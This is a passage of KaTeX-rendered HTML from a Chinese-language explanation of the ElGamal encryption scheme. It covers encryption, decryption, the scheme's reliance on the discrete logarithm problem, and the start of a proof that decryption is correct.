class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6666666666666666em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span></span></span></span>，作为公钥。</li><li>公开<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi></mrow><annotation encoding="application/x-tex">g</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>，保密<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span></span></span></span>。</li></ul></li><li><p><strong>加密过程</strong>：</p><ul><li>对于要加密的明文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span></span></span></span>，选择一个随机整数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span>，满足<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>&lt;</mo><mi>k</mi><mo>&lt;</mo><mi>p</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">1&lt;k&lt;p-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68354em;vertical-align:-0.0391em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>。</li><li>计算两个密文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">C_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">C_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>：<ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>1</mn></msub><mo>=</mo><msup><mi>g</mi><mi>k</mi></msup><mspace></mspace><mspace width="0.6666666666666666em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">C_1 = g^k \mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6666666666666666em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>2</mn></msub><mo>=</mo><mi>m</mi><mo>⋅</mo><msup><mi>y</mi><mi>k</mi></msup><mspace></mspace><mspace width="0.6666666666666666em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">C_2 = m \cdot y^k \mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.44445em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6666666666666666em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span></span></span></span></li></ul></li><li>发送的密文为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>C</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>C</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(C_1, C_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>。</li></ul></li><li><p><strong>解密过程</strong>：</p><ul><li>收到密文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>C</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>C</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(C_1, C_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>后，用私钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span></span></span></span>解密：</li><li>计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>C</mi><mn>1</mn><mrow><mo>−</mo><mi>x</mi></mrow></msubsup><mspace></mspace><mspace width="0.6666666666666666em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">C_1^{-x} \mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0777700000000001em;vertical-align:-0.266308em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.811462em;"><span style="top:-2.433692em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.1031310000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathdefault mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.266308em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6666666666666666em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span></span></span></span>，然后用它乘以<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">C_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>得到明文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span></span></span></span>：<ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><msub><mi>C</mi><mn>2</mn></msub><mo>⋅</mo><msubsup><mi>C</mi><mn>1</mn><mrow><mo>−</mo><mi>x</mi></mrow></msubsup><mspace></mspace><mspace width="0.6666666666666666em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">m = C_2 \cdot C_1^{-x} \mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0777700000000001em;vertical-align:-0.266308em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.811462em;"><span style="top:-2.433692em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.1031310000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathdefault mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.266308em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6666666666666666em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span></span></span></span></li></ul></li></ul></li></ol><p>这个方案的安全性主要基于离散对数问题的困难性，即在已知<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi></mrow><annotation encoding="application/x-tex">g</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>g</mi><mi>x</mi></msup><mspace></mspace><mspace width="0.6666666666666666em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">g^x \mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.858832em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6666666666666666em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span></span></span></span>的情况下，找出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span></span></span></span>是非常困难的。然而，ElGamal加密方案的一个主要缺点是密文的长度是明文的两倍，这可能在需要传输大量数据的情况下成为问题。</p><h1 id="解密的正确性证明">解密的正确性证明</h1><p>解密过程中的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span></span></span></span>是通过以下步骤计算得到的：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><msub><mi>C</mi><mn>2</mn></msub><mo>⋅</mo><msubsup><mi>C</mi><mn>1</mn><mrow><mo>−</mo><mi>x</mi></mrow></msubsup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">m = C_2 \cdot C_1^{-x} \mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.07777em;vertical-align:-0.256439em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8213309999999999em;"><span style="top:-2.4435610000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathdefault mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.256439em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span></span></span></span></span></p><p>我们可以将<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">C_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">C_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的定义代入上式，得到：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><mo stretchy="false">(</mo><mi>m</mi><mo>⋅</mo><msup><mi>y</mi><mi>k</mi></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo><mo>⋅</mo><mo stretchy="false">(</mo><msup><mi>g</mi><mi>k</mi></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mi>x</mi></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">m = (m \cdot y^k \mod p) \cdot (g^k \mod p)^{-x} \mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.093548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" 